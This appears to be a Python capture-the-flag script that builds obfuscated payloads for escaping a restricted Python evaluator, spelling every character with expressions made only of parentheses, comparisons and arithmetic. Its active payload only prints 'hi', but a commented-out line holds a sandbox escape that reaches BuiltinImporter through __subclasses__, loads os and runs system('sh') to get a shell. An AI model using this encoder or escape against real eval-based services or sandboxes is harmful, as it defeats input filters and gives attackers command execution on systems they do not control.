#!/usr/bin/env python3

# type: ignore

from math import sqrt


def encode_number_zero_to_ten(number: int):
    if number == 0:
        return """(()>())"""
    if number == 1:
        return """(()==())"""
    if number == 2:
        return """(()==())+(()==())"""  # 1 + 1
    if number == 3:
        return """(()==())+(()==())+(()==())"""  # 1 + 1 + 1
    if number == 4:
        return """(()==())+(()==())+(()==())+(()==())"""  # 1 + 1 + 1 + 1
    if number == 5:
        return """(()==())+(()==())+(()==())+(()==())+(()==())"""  # 1 + 1 + 1 + 1 + 1
    if number == 6:
        return """((()==())+(()==()))*((()==())+(()==())+(()==()))"""  # 2 * 3
    if number == 7:
        return """((()==())+(()==()))*((()==())+(()==())+(()==()))+(()==())"""  # 2 * 3 + 1
    if number == 8:
        return """((()==())+(()==()))**((()==())+(()==())+(()==()))"""  # 2 ** 3
    if number == 9:
        return """((()==())+(()==())+(()==()))**((()==())+(()==()))"""  # 3 ** 2
    if number == 10:
        return """((()==())+(()==())+(()==()))**((()==())+(()==()))+(()==())"""  # 3 ** 2 + 1


def find_closest_tuple(number: int, op, start: int = 1):
    curr_tuple = (start, start)
    curr_offset = number - op(*curr_tuple)

    stop = int(sqrt(number) + 1)
    for i in range(start, stop):
        for j in range(start, stop):
            offset = number - op(i, j)
            if offset >= 0 and offset < curr_offset:
                curr_offset = offset
                curr_tuple = (i, j)

    assert curr_offset >= 0
    assert number == op(*curr_tuple) + curr_offset

    return curr_offset, curr_tuple


def find_closest_mul_tuple(number: int):
    return find_closest_tuple(number, lambda x, y: x * y)


def find_closest_pow_tuple(number: int):
    return find_closest_tuple(number, lambda x, y: x ** y)


def encode_number(number: int):
    if number <= 10:
        return encode_number_zero_to_ten(number)

    mul_off, (m0, m1) = find_closest_mul_tuple(number)
    pow_off, (p0, p1) = find_closest_pow_tuple(number)

    if mul_off < pow_off:
        txt = "(" + encode_number(m0) + ")*(" + encode_number(m1) + ")"
        if mul_off > 0:
            txt += "+" + encode_number(mul_off)
    else:
        txt = "(" + encode_number(p0) + ")**(" + encode_number(p1) + ")"
        if pow_off > 0:
            txt += "+" + encode_number(pow_off)

    return txt


def encode_text(text: str):
    result = ""
    for ch in map(ord, text):
        # result += "{" + encode_number(ch) + ":c}"
        result += f"'%c' % ({encode_number(ch)}) + "
    result += "'osu'"
    return result


# payload = "[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('os').system('sh')"
payload = "print('hi')"
# payload = 'f"{}"'.format(encode_text(payload))
payload = '{}'.format(encode_text(payload))
with open("payload.txt", "w") as f:
    f.write(payload)
